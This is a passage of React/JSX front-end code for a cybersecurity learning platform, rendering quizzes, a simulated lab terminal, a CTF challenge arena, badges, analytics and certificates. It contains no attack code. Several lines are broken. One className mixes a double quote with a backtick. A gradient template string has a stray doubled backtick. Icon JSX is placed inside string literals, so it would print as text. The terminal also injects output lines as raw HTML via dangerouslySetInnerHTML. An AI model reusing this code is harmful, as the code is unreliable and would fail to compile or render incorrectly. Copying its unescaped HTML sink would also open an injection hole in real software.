                <button className={\`p-2.5 rounded-xl border border-[rgba(100,116,139,0.2)] \${voiceEnabled?'text-[#00f0ff]':'text-[#475569]'}\`} onClick={()=>setVoiceEnabled(!voiceEnabled)} data-tooltip={voiceEnabled?'Voice ON':'Voice OFF'}>{voiceEnabled?<Volume2 size={16}/>:<VolumeX size={16}/>}</button>
              </div>
            </div>
          </div>
        </div>)}

        {/* ═══ QUIZZES ═══ */}
        {activeTab==='quizzes'&&(<div className="space-y-6">
          <h1 className="text-2xl font-bold text-gradient-holo">Knowledge Quizzes</h1>
          {!quizCourse?<div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">{Object.entries(DEMO_QUIZZES).map(([cid,qs])=>{const course=DEMO_COURSES.find(c=>c.id===cid);if(!course)return null;return(<div key={cid} className="holo-card holo-card-3d p-5 cursor-pointer" onClick={()=>startQuiz(cid)} onMouseMove={handleTilt} onMouseLeave={resetTilt}><div className="flex items-center gap-2 mb-2"><BookOpen size={16} className="neon-text"/><span className="holo-badge holo-badge-cyan text-xs">{course.category}</span></div><h3 className="font-semibold mb-1">{course.title}</h3><p className="text-sm text-[#64748b] mb-3">{qs.length} questions · 5 min · {Math.round(70)}% to pass</p><button className="holo-btn holo-btn-sm w-full">Start Quiz</button></div>);})}</div>:!quizSubmitted?(
            <div className="holo-card p-6 max-w-2xl mx-auto">
              <div className="flex items-center justify-between mb-6"><h2 className="text-lg font-bold">Quiz: {DEMO_COURSES.find(c=>c.id===quizCourse)?.title}</h2><div className={\`flex items-center gap-2 \${quizTimeLeft<60?'text-pink-400':''}\`}><Clock size={16}/><span className="font-mono">{Math.floor(quizTimeLeft/60)}:{String(quizTimeLeft%60).padStart(2,'0')}</span></div></div>
              <div className="holo-progress mb-6"><div className="holo-progress-bar" style={{width:\`\${((quizIndex+1)/quizQuestions.length)*100}%\`}}/></div>
              <div className="mb-4"><p className="text-sm text-[#64748b] mb-1">Question {quizIndex+1} of {quizQuestions.length}</p><p className="font-medium">{quizQuestions[quizIndex].question}</p></div>
              <div className="space-y-2 mb-6">{quizQuestions[quizIndex].options.map((opt,i)=>(<button key={i} className={\`w-full text-left p-3 rounded-xl border transition-all \${quizAnswers[quizQuestions[quizIndex].id]===i?'border-[rgba(0,240,255,0.4)] bg-[rgba(0,240,255,0.08)]':'border-[rgba(30,41,59,0.5)] hover:border-[rgba(0,240,255,0.2)]'}\`} onClick={()=>setQuizAnswers(p=>({...p,[quizQuestions[quizIndex].id]:i}))}><span className="text-sm">{opt}</span></button>))}</div>
              <div className="flex justify-between"><button className="holo-btn holo-btn-sm" disabled={quizIndex===0} onClick={()=>setQuizIndex(p=>p-1)}>Previous</button>{quizIndex<quizQuestions.length-1?<button className="holo-btn holo-btn-sm holo-btn-primary" onClick={()=>setQuizIndex(p=>p+1)}>Next</button>:<button className="holo-btn holo-btn-primary" onClick={submitQuiz}>Submit</button>}</div>
            </div>):(
            <div className="holo-card p-6 max-w-2xl mx-auto text-center">
              <div className="text-5xl mb-4">{quizScore>=70?'🎉':'😐'}</div><h2 className="text-2xl font-bold mb-2">{quizScore>=70?'Quiz Passed!':\`Score: \${quizScore}%\`}</h2><p className="text-[#64748b] mb-6">You scored {quizScore}% (need 70% to pass)</p>
              <div className="space-y-3 text-left mb-6">{quizQuestions.map(q=>(<div key={q.id} className={\`p-3 rounded-xl border \${quizAnswers[q.id]===q.correctIndex?'border-green-400/30 bg-green-400/5':'border-pink-400/30 bg-pink-400/5'}\`}><p className="text-sm font-medium">{q.question}</p><p className="text-xs text-[#64748b] mt-1">{q.explanation}</p></div>))}</div>
              <button className="holo-btn" onClick={()=>{setQuizCourse(null);setActiveTab('dashboard');}}>Back to Dashboard</button>
            </div>)}
        </div>)}

        {/* ═══ LAB TERMINAL ═══ */}
        {activeTab==='labs'&&(<div className="space-y-4" style={{height:'calc(100vh - 140px)'}}>
          <div className="flex items-center justify-between flex-wrap gap-3"><h1 className="text-xl font-bold text-gradient-cyan">Lab Terminal</h1><div className="flex gap-2">{labShowScenarios?null:<button className="holo-btn holo-btn-sm" onClick={()=>{setLabShowScenarios(true);setSelectedLab(null);setLabActive(false);}}><ChevronLeft size={14}/>All Labs</button>}</div></div>
          {labShowScenarios?(
            <ScrollArea className="h-[calc(100vh-220px)]"><div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">{DEMO_LABS.map(lab=>(
              <div key={lab.id} className="holo-card holo-card-3d challenge-card p-5 cursor-pointer" onClick={()=>startLab(lab)} onMouseMove={handleTilt} onMouseLeave={resetTilt}>
                <div className="flex items-center justify-between mb-3"><span className={\`holo-badge ctf-difficulty-\${lab.difficulty}\`}>{lab.difficulty}</span><span className="text-xs text-[#64748b]"><Clock size={12} className="inline mr-1"/>{lab.duration}</span></div>
                <h3 className="font-semibold mb-2">{lab.title}</h3><p className="text-sm text-[#64748b] mb-3 line-clamp-2">{lab.description}</p>
                <div className="text-xs text-[#64748b]"><Target size={12} className="inline mr-1"/>{lab.objectives.length} objectives</div>
              </div>))}</div></ScrollArea>):(
            <div className="flex gap-4 h-[calc(100vh-220px)]">
              {/* Lab Info Panel */}
              <div className="w-72 shrink-0 holo-card p-4 overflow-y-auto hidden lg:block">
                {selectedLab&&<><h3 className="font-semibold mb-3 neon-text">{selectedLab.title}</h3>
                <div className="flex gap-2 mb-4"><span className={\`holo-badge ctf-difficulty-\${selectedLab.difficulty}\`}>{selectedLab.difficulty}</span><span className="holo-badge holo-badge-cyan">{selectedLab.duration}</span></div>
                <div className="space-y-3 mb-4">{selectedLab.steps.map((s,i)=>(<div key={i} className={\`lab-step \${i<completedObjCount?'lab-step-completed':i===completedObjCount?'lab-step-active':''}\`}><p className="text-xs">{s}</p></div>))}</div>
                <div className="glow-separator my-4"/><h4 className="text-sm font-semibold mb-2">Objectives ({completedObjCount}/{labObjectives.length})</h4>
                <div className="space-y-2">{labObjectives.map(o=>(<div key={o.id} className={\`flex items-start gap-2 text-xs \${o.completed?'text-green-400':''}\`}><span>{o.completed?'<CheckCircle2 size={14}/>':'<div className="w-3.5 h-3.5 rounded-full border border-[rgba(100,116,139,0.3)] mt-0.5"/>'}</span><span>{o.description}</span></div>))}</div>
                {selectedLab.hints.length>0&&<><div className="glow-separator my-4"/><h4 className="text-sm font-semibold mb-2">Hints</h4><div className="space-y-1">{selectedLab.hints.map((h,i)=>(<p key={i} className="text-xs text-[#64748b]"><Lightbulb size={10} className="inline mr-1"/> {h}</p>))}</div></>}
                </>}
              </div>
              {/* Terminal */}
              <div className="flex-1 holo-terminal matrix-bg flex flex-col">
                <div className="holo-terminal-header"><div className="holo-terminal-dot" style={{background:'#ff5f57'}}/><div className="holo-terminal-dot" style={{background:'#febc2e'}}/><div className="holo-terminal-dot" style={{background:'#28c840'}}/><span className="ml-3 text-xs text-[#64748b]">{selectedLab?selectedLab.title:'CyberShield Lab'}</span><span className="ml-auto text-xs text-[#475569]">student@cybershield</span></div>
                <div className="holo-terminal-body flex-1 overflow-y-auto" ref={labEndRef as React.RefObject<HTMLDivElement>}>{labOutput.map((line,i)=><div key={i} className="whitespace-pre-wrap text-[13px] leading-relaxed" dangerouslySetInnerHTML={{__html:line.replace(/\\x1b\\[([0-9;]*)m/g,'<span class="ansi-$1">').replace(/<span class="ansi-">/g,'<span>').replace(/<span class="ansi-1;32m">/g,'<span style="color:#39ff14">').replace(/<span class="ansi-1;34m">/g,'<span style="color:#60a5fa">').replace(/<span class="ansi-1;33m">/g,'<span style="color:#fbbf24">').replace(/<span class="ansi-1;36m">/g,'<span style="color:#00f0ff">').replace(/<span class="ansi-2m">/g,'<span style="opacity:0.5">').replace(/<span class="ansi-0m">/g,'</span>')}}/>)}</div>
                <div className="p-3 border-t border-[rgba(0,240,255,0.08)] flex items-center gap-2">
                  <span className="text-xs text-green-400 shrink-0">student@cybershield:~$</span>
                  <input className="flex-1 bg-transparent border-none outline-none text-sm font-mono text-[#e2e8f0] placeholder:text-[#475569]" placeholder={labActive?"Enter command...":"Start a lab to begin"} value={labInput} onChange={e=>setLabInput(e.target.value)} onKeyDown={e=>{if(e.key==='Enter'){handleLabCommand(labInput);}}} disabled={!labActive}/>
                </div>
              </div>
            </div>)}
        </div>)}

        {/* ═══ CTF ARENA ═══ */}
        {activeTab==='ctf'&&(<div className="space-y-6">
          <div className="flex items-center justify-between flex-wrap gap-3"><h1 className="text-2xl font-bold text-gradient-holo">CTF Arena</h1>
            <div className="flex items-center gap-4 text-sm"><span className="text-[#64748b]">Points: <span className="neon-text font-bold">{solvedCtfPoints}/{totalCtfPoints}</span></span><span className="text-[#64748b]">Solved: <span className="neon-text-green font-bold">{ctfChallenges.filter(c=>c.solved).length}/{ctfChallenges.length}</span></span></div></div>
          <div className="flex gap-2 flex-wrap">
            {CTF_CATEGORIES.map(c=>(<button key={c.id} className={\`holo-badge \${ctfFilter===c.id?'holo-badge-cyan':'border-[rgba(100,116,139,0.3)] text-[#64748b]'}\`} onClick={()=>setCtfFilter(c.id)}>{c.label}</button>))}
            <select className="holo-input py-1 px-2 text-xs rounded-lg" value={ctfDifficulty} onChange={e=>setCtfDifficulty(e.target.value)}>{CTF_DIFFICULTIES.map(d=>(<option key={d.id} value={d.id}>{d.label}</option>))}</select>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">{filteredCtf.map(c=>{const CatIcon=CAT_ICONS[c.category]||Hexagon;return(
            <div key={c.id} className={\`holo-card holo-card-3d challenge-card p-5 cursor-pointer \${c.solved?'opacity-60':''}\`} onClick={()=>{setSelectedCtf(c);setCtfHintUsed(false);setCtfFlag('');}} onMouseMove={handleTilt} onMouseLeave={resetTilt}>
              <div className="flex items-center justify-between mb-3"><div className="flex items-center gap-2"><CatIcon size={16} className={\`cat-\${c.category}\`}/><span className="text-xs \${CAT_COLORS[c.category]||''}\`>{c.category}</span></div><span className={\`holo-badge ctf-difficulty-\${c.difficulty}\`}>{c.difficulty}</span></div>
              <h3 className="font-semibold mb-2">{c.title}</h3><p className="text-sm text-[#64748b] mb-3 line-clamp-2">{c.description.split('\\n')[0]}</p>
              <div className="flex items-center justify-between"><span className={\`text-sm font-bold \${c.solved?'text-green-400':'neon-text'}\`}>{c.points} pts</span><span className="text-xs text-[#64748b]"><Users size={12} className="inline mr-1"/>{c.solveCount} solves</span></div>
              {c.solved&&<div className="mt-2"><span className="holo-badge holo-badge-green text-xs"><CheckCircle2 size={12} className="inline mr-1"/>Solved</span></div>}
            </div>)})}</div>
          {/* CTF Detail Dialog */}
          <Dialog open={!!selectedCtf} onOpenChange={()=>setSelectedCtf(null)}>
            {selectedCtf&&<DialogContent className="max-w-lg glass-panel border-[rgba(0,240,255,0.1)]"><DialogHeader><DialogTitle className="flex items-center gap-2">{selectedCtf.title}{selectedCtf.solved&&<CheckCircle2 size={18} className="text-green-400"/>}</DialogTitle><DialogDescription><div className="flex gap-2 mt-2"><span className={\`holo-badge ctf-difficulty-\${selectedCtf.difficulty}\`}>{selectedCtf.difficulty}</span><span className="holo-badge holo-badge-cyan">{selectedCtf.points} pts</span><span className="holo-badge holo-badge-purple">{selectedCtf.solveCount} solves</span></div></DialogDescription></DialogHeader>
              <div className="space-y-4 mt-4">
                <div className="text-sm text-[#cbd5e1] whitespace-pre-wrap leading-relaxed">{selectedCtf.description}</div>
                {selectedCtf.hint&&!selectedCtf.solved&&<div><button className="holo-btn holo-btn-sm text-xs" onClick={()=>setCtfHintUsed(!ctfHintUsed)}>{ctfHintUsed?<EyeOff size={14} className="inline mr-1"/>Hide Hint (-25% pts):<Lightbulb size={14} className="inline mr-1"/>Show Hint (-25% pts)</button>{ctfHintUsed&&<p className="text-sm mt-2 p-3 rounded-xl bg-[rgba(255,107,53,0.08)] border border-[rgba(255,107,53,0.2)] text-orange-300"><Lightbulb size={14} className="inline mr-1"/> {selectedCtf.hint}</p>}</div></div>}
                {selectedCtf.solved?<div className="text-center py-4"><CheckCircle2 size={40} className="text-green-400 mx-auto mb-2"/><p className="neon-text-green font-semibold">Challenge Solved!</p><p className="text-sm text-[#64748b]">+{selectedCtf.points} XP earned</p></div>:<div><label className="text-sm text-[#64748b] mb-1 block">Submit Flag</label><div className="flex gap-2"><input className="holo-input flex-1 font-mono text-sm" placeholder="CYBERSHIELD{...}" value={ctfFlag} onChange={e=>setCtfFlag(e.target.value)} onKeyDown={e=>{if(e.key==='Enter')submitCtfFlag(selectedCtf.id);}}/><button className="holo-btn holo-btn-primary" onClick={()=>submitCtfFlag(selectedCtf.id)}><Flag size={16} className="inline mr-1"/>Submit</button></div></div>}
                {ctfResult&&<motion.div initial={{opacity:0,y:10}} animate={{opacity:1,y:0}} className={\`p-3 rounded-xl text-sm font-medium text-center \${ctfResult.correct?'bg-green-400/10 border border-green-400/30 text-green-400':'bg-pink-400/10 border border-pink-400/30 text-pink-400'}\`}>{ctfResult.message}</motion.div>}
              </div></DialogContent>}
          </Dialog>
        </div>)}

        {/* ═══ RANK & BADGES ═══ */}
        {activeTab==='gamification'&&(<div className="space-y-6">
          <h1 className="text-2xl font-bold text-gradient-holo">Rank & Badges</h1>
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
            <div className="holo-card p-6">
              <div className="flex items-center gap-4 mb-6"><div className="w-16 h-16 rounded-2xl bg-gradient-to-br from-[rgba(0,240,255,0.15)] to-[rgba(191,0,255,0.15)] flex items-center justify-center"><Shield className="w-8 h-8 neon-text"/></div><div><h2 className="text-xl font-bold">{user.name}</h2><p className="text-sm neon-text">{LEVEL_TITLES[Math.min(currentLevel-1,LEVEL_TITLES.length-1)]}</p><p className="text-xs text-[#64748b]">Level {currentLevel}</p></div></div>
              <div className="holo-progress mb-2"><div className="holo-progress-bar" style={{width:\`\${Math.min(xpProgress,100)}%\`}}/></div>
              <div className="flex justify-between text-sm"><span className="text-[#64748b]">{currentXp.toLocaleString()} XP</span><span className="text-[#64748b]">{(xpForNext-currentXp).toLocaleString()} XP to Level {currentLevel+1}</span></div>
              <div className="grid grid-cols-3 gap-4 mt-6">{[{label:'CTF Solves',value:String(ctfChallenges.filter(c=>c.solved).length),icon:Flag},{label:'Badges',value:String(DEMO_BADGES.filter(b=>b.earned).length),icon:Award},{label:'Streak',value:\`\${user.streakDays}d\`,icon:Flame}].map((s,i)=>(<div key={i} className="text-center"><s.icon size={18} className="mx-auto mb-1 text-[#64748b]"/><p className="text-lg font-bold">{s.value}</p><p className="text-xs text-[#475569]">{s.label}</p></div>))}</div>
            </div>
            <div className="holo-card p-6">
              <h3 className="font-semibold mb-4 flex items-center gap-2"><Award size={18} className="neon-text-purple"/>Badges ({DEMO_BADGES.filter(b=>b.earned).length}/{DEMO_BADGES.length})</h3>
              <div className="grid grid-cols-2 gap-3">{DEMO_BADGES.map(b=>(<div key={b.name} className={\`flex items-center gap-3 p-3 rounded-xl border \${b.earned?'border-[rgba(0,240,255,0.1)] bg-[rgba(0,240,255,0.02)]':'border-[rgba(30,41,59,0.3)] opacity-50'}\`}><div className={\`hex-badge hex-badge-\${b.rarity}\`}>{b.icon}</div><div><p className="text-sm font-medium">{b.name}</p><p className="text-xs text-[#64748b]">{b.description}</p><p className={\`text-xs mt-0.5 \${b.rarity==='legendary'?'text-orange-400':b.rarity==='epic'?'text-purple-400':b.rarity==='rare'?'text-cyan-400':'text-green-400'}\`}>{b.rarity} · +{b.xpReward} XP</p></div></div>))}</div>
            </div>
          </div>
          {/* Leaderboard */}
          <div className="holo-card p-6"><h3 className="font-semibold mb-4 flex items-center gap-2"><Trophy size={18} className="text-yellow-400"/>Global Leaderboard</h3>
          <div className="space-y-1">{DEMO_LEADERBOARD.map(e=>(<div key={e.id} className={\`leaderboard-row flex items-center gap-4 p-3 rounded-xl \${e.id==='l8'?'bg-[rgba(0,240,255,0.05)]':''}\`}><span className={\`w-8 text-center font-bold text-sm \${e.rank<=3?\`rank-\${e.rank}\`:'text-[#64748b]'}\`}>{e.rank}</span><Avatar className="w-8 h-8"><AvatarFallback className={\`text-xs \${e.rank===1?'bg-yellow-400/20 text-yellow-400':e.rank===2?'bg-gray-400/20 text-gray-300':e.rank===3?'bg-orange-400/20 text-orange-400':'bg-[rgba(0,240,255,0.1)] text-[#00f0ff]'}\`}>{e.name.split(' ').map(n=>n[0]).join('')}</AvatarFallback></Avatar><div className="flex-1 min-w-0"><p className="text-sm font-medium truncate">{e.name}</p><p className="text-xs text-[#64748b]">{e.title} · Lvl {e.level}</p></div><div className="text-right"><p className="text-sm font-bold neon-text">{e.xp.toLocaleString()}</p><p className="text-xs text-[#64748b]"><Flag size={10} className="inline mr-0.5"/>{e.ctfSolves} · <Award size={10} className="inline mr-0.5"/>{e.badges}</p></div></div>))}</div></div>
        </div>)}

        {/* ═══ ANALYTICS ═══ */}
        {activeTab==='analytics'&&(<div className="space-y-6">
          <h1 className="text-2xl font-bold text-gradient-holo">Learning Analytics</h1>
          <div className="grid grid-cols-2 lg:grid-cols-4 gap-4">
            {[{label:'Focus Score',value:focusScore+'%',bar:focusScore,color:'#00f0ff'},{label:'Quiz Accuracy',value:'82%',bar:82,color:'#39ff14'},{label:'Lab Completion',value:'68%',bar:68,color:'#bf00ff'},{label:'Comprehension',value:'78%',bar:78,color:'#ff6b35'}].map((s,i)=>(
              <div key={i} className="stat-card-3d p-4" style={{'--stat-color':s.color} as React.CSSProperties} onMouseMove={handleTilt} onMouseLeave={resetTilt}>
                <p className="text-xs text-[#64748b] mb-1">{s.label}</p><p className="text-2xl font-bold" style={{color:s.color}}>{s.value}</p><div className="holo-progress h-1.5 mt-2"><div className="holo-progress-bar" style={{width:\`\${s.bar}%\`,background:\`\`linear-gradient(90deg, \${s.color}, \${s.color}88)\`}}/></div>
              </div>))}
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div className="holo-card p-5"><h3 className="font-semibold mb-4">Weekly Activity</h3><div className="space-y-3">{[{day:'Mon',val:85},{day:'Tue',val:92},{day:'Wed',val:60},{day:'Thu',val:78},{day:'Fri',val:95},{day:'Sat',val:45},{day:'Sun',val:30}].map(d=>(<div key={d.day} className="flex items-center gap-3"><span className="text-xs text-[#64748b] w-8">{d.day}</span><div className="flex-1 holo-progress h-2"><div className="holo-progress-bar" style={{width:\`\${d.val}%\`,background:d.val>80?'linear-gradient(90deg,#39ff14,#00f0ff)':d.val>50?'linear-gradient(90deg,#00f0ff,#bf00ff)':'linear-gradient(90deg,#ff006e,#ff6b35)'}}/></div><span className="text-xs text-[#64748b] w-8 text-right">{d.val}%</span></div>))}</div></div>
            <div className="holo-card p-5"><h3 className="font-semibold mb-4">Skill Breakdown</h3><div className="space-y-3">{[{skill:'Network Security',val:85},{skill:'Cryptography',val:70},{skill:'Web Security',val:60},{skill:'Forensics',val:40},{skill:'Cloud Security',val:25},{skill:'Malware Analysis',val:20}].map(s=>(<div key={s.skill}><div className="flex justify-between text-sm mb-1"><span>{s.skill}</span><span className={s.val>70?'text-green-400':s.val>40?'text-cyan-400':'text-orange-400'}>{s.val}%</span></div><div className="holo-progress h-2"><div className="holo-progress-bar" style={{width:\`\${s.val}%\`}}/></div></div>))}</div></div>
          </div>
          <div className="holo-card p-5"><h3 className="font-semibold mb-4">Performance Insights</h3><div className="grid grid-cols-1 md:grid-cols-3 gap-4"><div className="p-4 rounded-xl border border-green-400/20 bg-green-400/5"><p className="text-xs text-green-400 font-semibold mb-1">Strengths</p><p className="text-sm text-[#cbd5e1]">Network scanning, TCP/IP protocols, cryptography basics, firewall configuration</p></div><div className="p-4 rounded-xl border border-orange-400/20 bg-orange-400/5"><p className="text-xs text-orange-400 font-semibold mb-1">Needs Improvement</p><p className="text-sm text-[#cbd5e1]">Cloud security architecture, advanced forensics, mobile application testing</p></div><div className="p-4 rounded-xl border border-cyan-400/20 bg-cyan-400/5"><p className="text-xs neon-text font-semibold mb-1">Recommendations</p><p className="text-sm text-[#cbd5e1]">Focus on cloud security modules and complete the advanced forensics lab for a well-rounded skillset.</p></div></div></div>
        </div>)}

        {/* ═══ CERTIFICATES ═══ */}
        {activeTab==='certificates'&&(<div className="space-y-6">
          <h1 className="text-2xl font-bold text-gradient-holo">Certificates</h1>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            {DEMO_COURSES.filter(c=>c.enrolled&&c.progress&&c.progress>=90).length>0?DEMO_COURSES.filter(c=>c.enrolled&&c.progress&&c.progress>=90).map(c=>(
              <div key={c.id} className="certificate-card p-6">
                <div className="relative z-10">
                  <div className="flex items-center justify-between mb-4"><div className="holo-shield p-2 rounded-xl"><GraduationCap className="w-6 h-6 neon-text"/></div><span className="holo-badge holo-badge-green">Verified</span></div>
                  <h3 className="text-lg font-bold mb-1">{c.title}</h3>
                  <div className="space-y-2 text-sm text-[#64748b]"><p>Awarded to: <span className="text-[#e2e8f0]">{user.name}</span></p><p>Date: <span className="text-[#e2e8f0]">July 22, 2026</span></p><p>Certificate ID: <span className="text-[#00f0ff] font-mono text-xs">CYB-{user.id.slice(0,8).toUpperCase()}</span></p></div>
                  <div className="mt-4 flex gap-2"><button className="holo-btn holo-btn-sm holo-btn-primary"><Download size={14} className="inline mr-1"/>Download PDF</button><button className="holo-btn holo-btn-sm"><Copy size={14} className="inline mr-1"/>Copy Link</button></div>
                </div>
              </div>)):(
              <div className="holo-card p-12 col-span-2 text-center"><Award size={48} className="mx-auto text-[#475569] mb-4"/><h3 className="text-lg font-semibold text-[#64748b]">No Certificates Yet</h3><p className="text-sm text-[#475569] mt-2">Complete a course with 90%+ progress to earn a certificate. Keep learning!</p></div>
            )}
            {/* In-progress certificates */}
            {DEMO_COURSES.filter(c=>c.enrolled&&c.progress&&c.progress<90).map(c=>(
              <div key={c.id} className="certificate-card p-6 opacity-70">
                <div className="relative z-10">
                  <div className="flex items-center gap-2 mb-4"><GraduationCap size={20} className="text-[#475569]"/><h3 className="text-lg font-semibold text-[#64748b]">{c.title}</h3></div>
                  <div className="holo-progress h-2 mb-3"><div className="holo-progress-bar" style={{width:\`\${c.progress||0}%\`}}/></div>
                  <p className="text-sm text-[#475569]">{c.progress}% complete — {(100-(c.progress||0))}% more to unlock certificate</p>
                </div>
              </div>))}
          </div>
        </div>)}

      </motion.div></AnimatePresence>
    </main>
  </div>);
}
